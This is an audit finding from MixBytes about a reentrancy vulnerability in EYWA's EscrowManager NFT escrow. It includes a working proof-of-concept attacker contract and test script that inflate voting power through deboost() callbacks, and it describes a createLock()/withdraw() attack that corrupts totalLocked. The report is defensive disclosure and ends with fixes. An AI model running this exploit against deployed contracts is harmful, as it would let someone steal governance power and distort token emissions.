---
tags:
  - lang/solidity
  - sector/farm
  - sector/governance
  - sector/nft
  - platform/mixbytes
  - has/github
  - has/poc
  - severity/high
  - vuln/reentrancy/single-function
  - novelty/known-pattern
  - misassumption/external-call-is-safe
  - fix/use-reentrancy-guard
  - trigger/reentrancy-callback
protocol: "[[EYWA]]"
auditors:
  - "[[MixBytes]]"
report: "https://github.com/mixbytes/audits_public/blob/master/EYWA/DAO/README.md#4-reentrancy-in-escrowmanager"
genome:
  - "[[single-function]]"
  - "[[known-pattern]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[reentrancy-guard]]"
---
# Reentrancy in `EscrowManager`

- id: 44334
- impact: HIGH
- protocol: [[EYWA]]
- reporter: MixBytes
- source: https://github.com/mixbytes/audits_public/blob/master/EYWA/DAO/README.md#4-reentrancy-in-escrowmanager

## Summary


The OpenZeppelin ERC721 NFT implementation has a vulnerability that can be exploited by hackers. This vulnerability allows them to manipulate the boosting mechanism and gain an unfair advantage in voting power. This can happen when certain methods are called, such as `createLock()`, `deboost()`, and `withdraw()`, and the state of the `EscrowManager` is inconsistent. This can lead to corrupt storage variables and inaccurate calculations. The report provides a proof-of-concept example of how this can be done and recommends using certain approaches to prevent this type of reentrancy attack. 

## Details

##### Description

OpenZeppelin ERC721 NFT implementations invoke the receiver whenever the `safeTransferFrom()` or `safeMint()` methods are called.

A hacker can exploit this mechanism by triggering a callback from `EscrowManager` during the execution of methods such as `createLock()` (when `_safeMint()` is invoked), `deboost()` (when `safeTransferFrom()` is invoked), and `withdraw()` (also when `safeTransferFrom()` is invoked), especially when the state of `EscrowManager` is inconsistent. This can corrupt storage variables or result in voting power gain.

**Example 1**: Reentrancy in the `deboost()` method with duplicate boosters.

An attacker can exploit a reentrancy vulnerability in the `deboost()` method, manipulating the boosting mechanism to their advantage:
1. The attacker calls the `deboost()` method and passes the same boosting NFT ID multiple times, e.g., `deboost(escrowId, [1,1,1,1,1,1,1,1])`.
2. During the transfer process, the `deboost()` method triggers a callback to the attacker’s contract.
3. Each time the attacker’s contract receives the NFT, it transfers the NFT back to `EscrowManager`.

As a result, the escrow boosting coverage can be reduced to zero, even though other boosting NFTs may still be present and not withdrawn. This makes subsequent calculations inaccurate, disproportionately **inflating** the attacker’s `lockAmount` and voting power.

In the following proof-of-concept (PoC), after the attacker calls `deboost()`, their voting power **increases** significantly:
```
Hacker votes before deboost: 4402998660126770n
Hacker votes after  deboost: 1105121050824042828n
```

The PoC consists of two parts of code. First, the js-part:
```
await checkDeboostReentrancy(
    "aliceTokenId3", 
    "Common2", 
    "eywa NFT locked without boost");
async function checkDeboostReentrancy(
    aliceTokenId, eywaTokenId, description) {
describe(`Test reentrancy`, () => {
  describe("Test", () => {
  it("Test Reentrancy", async () => {
    const { eywaNFT, escrowManager, alice, AliceTokenId, TokenId } = 
          await loadFixture(deploy);
    
    const otherBoosters = 
    await escrowManager.getBoostersByTokenId(AliceTokenId["aliceTokenId4"])
    
    await escrowManager.connect(alice).deboost(
        AliceTokenId["aliceTokenId4"], [otherBoosters[0]])
    await eywaNFT.connect(alice).approve(
        await escrowManager.getAddress(), otherBoosters[0])
    await escrowManager.connect(alice).boost(
        AliceTokenId[aliceTokenId], [otherBoosters[0]])
    console.log(
        await escrowManager.getBoostersByTokenId(AliceTokenId[aliceTokenId]))

    const hackerContract = await (
        await ethers.getContractFactory("HackerHolder")).deploy(
          await escrowManager.getAddress(),
          AliceTokenId[aliceTokenId],
          TokenId[eywaTokenId],
          await escrowManager.COLLECTION(),
    )
    const hackerAddress = await hackerContract.getAddress()
    await escrowManager.connect(alice).transferFrom(
        alice, hackerAddress, AliceTokenId[aliceTokenId])
    console.log("Hacker votes before deboost", 
                await escrowManager.getVotes(hackerAddress))
    await hackerContract.exploit()
    console.log("Hacker votes after  deboost", 
                await escrowManager.getVotes(hackerAddress))
  })
})
})
}
```

Second, the hacker's contract:
```solidity
contract HackerHolder is ERC721Holder {
  ICollection public immutable COLLECTION;
  EscrowManager es;
  uint escrowId;
  uint boostId;
  uint256[] collectionTokenIds;
  uint exploiting;

  constructor(
      EscrowManager es_, 
      uint escrowId_, 
      uint boostId_, 
      address collection) {
    COLLECTION = ICollection(collection);
    es = es_;
    escrowId = escrowId_;
    boostId = boostId_;
  }

  function exploit() external {
    delete collectionTokenIds;
    collectionTokenIds.push(boostId);
    collectionTokenIds.push(boostId);
    exploiting = collectionTokenIds.length - 1;

    es.deboost(escrowId, collectionTokenIds);
  }

  function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
  ) public virtual override returns (bytes4) {
    if (exploiting > 0) {
      exploiting--;
      COLLECTION.transferFrom(address(this), address(es), boostId);
    }
    return super.onERC721Received.selector;
  }
}
```

**Example 2**: A hacker can corrupt storage variables via `createLock()` and `withdraw()` methods.

**Attack Scenario:**
1. The attacker calls the `createLock()` method to mint a new NFT lock.
2. During the `_safeMint()` process, the `ERC721Utils.checkOnERC721Received()` callback is triggered on the attacker’s contract.
3. Within this callback, the attacker calls `EscrowManager.withdraw()`, burning the newly minted NFT. 
4. At this point, the NFT’s state has not yet been fully updated in the `createLock()` function, allowing the attacker to corrupt the **totalLocked** value.

This altered **totalLocked** value could distort token emission calculations in the `emissionManager` contract, leading to unfair or excessive token distributions.

##### Recommendation

We recommend using the following approaches against reentrancy:
1. Use Check-Effect-Interaction pattern when minting, burning or transferring NFTs.
2. Use reentrancy guard modifiers.
3. Use methods that do not cause an unintentional callback.

***
